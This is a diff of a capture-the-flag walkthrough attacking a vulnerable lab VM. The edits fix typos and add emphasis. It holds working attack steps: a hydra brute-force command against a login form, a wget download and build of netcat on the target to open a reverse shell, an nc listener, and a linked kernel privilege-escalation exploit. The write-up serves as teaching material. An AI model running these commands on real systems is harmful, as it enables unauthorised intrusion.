@@ -35,7 +35,7 @@ OS details: Linux 2.6.9 - 2.6.30*
     I set up a directory discovery while I look at other stuff:
     *root@kali:/usr/share/exploitdb/platforms# dirb http://192.168.0.11 /usr/share/dirb/wordlists/big.txt*
 
-    It does not find anything interesting, just manual pages for Apache and forbidden directories. Looking at the headers of the response, there is a X-Powered-By:"PHP/4.3.9". I don't remember seeing this header before, it might have been put there as a hint. Looking for exploits for that PHP version we get:
+    It does not find anything interesting, just manual pages for Apache and forbidden directories. Looking at the headers of the response, there is a *X-Powered-By:"PHP/4.3.9"*. I don't remember seeing this header before, it might have been put there as a hint. Looking for exploits for that PHP version we get:
     *# searchsploit php 4.3.9
 ---------------------------------------------------------------------- ----------------------------------
  Exploit Title                                                |  Path
@@ -77,15 +77,15 @@ PHP 4.3.x/5.0 - 'openlog()' Buffer Overflow                                     
 + End Time:         2017-09-10 11:46:30 (GMT1) (42 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested*
-    I look for exploits for Apache, OpenSSH, Linux Kernel but nothing interesting. I will try to make a PUT request to the web service on 631:
+    I look for exploits for Apache, OpenSSH, Linux Kernel but nothing interesting. I will try to make a *PUT* request to the web service on *631*:
     *# curl -X PUT -d file=/tmp/test http://192.168.0.11:631
 <HTML><HEAD><TITLE>403 Forbidden</TITLE></HEAD><BODY><H1>Forbidden</H1>You don't have permission to access the resource on this server.</BODY></HTML>*
 
-    The most interesting functionality so far is the login page. I play a bit with the login form on Burp and immediatly spot the comment:
+    The most interesting functionality so far is the login page. I play a bit with the login form on Burp and immediately spot the comment:
     *<!-- Start of HTML when logged in as Administator -->*
 
-    This seems a very interesting hint as it implies that there is a username called Administrator, let's set up a brute force attack with hydra. We can use 'in as Administator --></body>' as a delimiter to find a valid password:
-    *# hydra -l Administrator -P /usr/share/wordlists/metasploit/password.lst 192.168.0.11 http-post-form "/index.php:uname=^USER^&psw=^PASS^&btnLogin=Login:in as Administator -->\n</body>"*
+    This seems a very interesting hint as it implies that there is a username called *Administrator*, let's set up a brute force attack with hydra. We can use 'in as Administrator --></body>' as a delimiter to find a valid password:
+    *# hydra -l Administrator -P /usr/share/wordlists/metasploit/password.lst 192.168.0.11 http-post-form "/index.php:uname=^USER^&psw=^PASS^&btnLogin=Login:in as Administrator -->\n</body>"*
 
     We also scan the MySql server using metasploit:
     *msf > use auxiliary/scanner/mysql/mysql_version
@@ -198,13 +198,13 @@ rtt min/avg/max/mdev = 0.009/0.013/0.019/0.005 ms, pipe 2
 uid=48(apache) gid=48(apache) groups=48(apache)
 </pre>*
 
-    Next step is to elevent privileges to root. I run a ps command to see the processes running.
+    Next step is to elevate privileges to root. I run a ps command to see the processes running.
     *root     2795    1  0 03:12 ?       00:00:00 httpd
 root     2821    1  0 03:12 ?       00:00:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --err-log=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid
 mysql    2874  2821  0 03:12 ?       00:00:27 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --socket=/var/lib/mysql/mysql.sock*
 
     Mysql is running as root. I will upload a PHP shell to work easily. We don't have write permissions to the web server root so that is not an option.
-    If netcat is install we can do a reverse shell. Netcat is not installed but wget is so we can download it. I try the followind:
+    If netcat is install we can do a reverse shell. Netcat is not installed but wget is so we can download it. I try the following:
     *cd /tmp && wget --no-check-certificate http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz && tar -xvf netcat-0.7.1.tar.gz && cd netcat-0.7.1 && ./configure && make && src/netcat --help*
 
     But tar is not installed. I compile it in my Kali box and upload the binary to a public HTTP server to see if we are lucky. It does not work. I try to run a reverse shell using bash as follows:
@@ -213,7 +213,11 @@ mysql    2874  2821  0 03:12 ?       00:00:27 /usr/libexec/mysqld --basedir=/usr
     But i keep getting the following error in my reverse netcat:
     *# nc  -l  192.168.0.4 -p 81
 invalid connection to [192.168.0.4] from (UNKNOWN) [192.168.0.11] 39068*
-    The version of the kernel is very old. The first result on google shows the following exploit for eleveting privileges on Linux Kernel 2.4.x/2.6.x *https://www.exploit-db.com/exploits/9545/*. I give it a shot:
+    The version of the kernel is very old. The first result on google shows the following exploit for elevating privileges on Linux Kernel 2.4.x/2.6.x
+
+    *https://www.exploit-db.com/exploits/9545/*
+
+    I give it a shot:
     *POST /pingit.php HTTP/1.1
 Host: 192.168.0.11
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
